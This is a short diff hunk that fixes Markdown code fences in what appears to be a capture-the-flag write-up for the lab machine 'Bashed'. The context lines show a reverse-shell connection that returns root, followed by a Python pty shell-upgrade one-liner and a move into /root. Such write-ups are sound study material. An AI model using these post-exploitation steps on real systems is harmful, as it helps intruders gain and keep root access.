@@ -298,9 +298,10 @@ Connection received on 10.10.10.68 60522
 # whoami
 whoami
 root
+```
 
 ```
-\# python3 -c "import pty;pty.spawn('/bin/bash')"
+# python3 -c "import pty;pty.spawn('/bin/bash')"
 python3 -c "import pty;pty.spawn('/bin/bash')"
 root@bashed:/scripts# cd /root
 cd /root
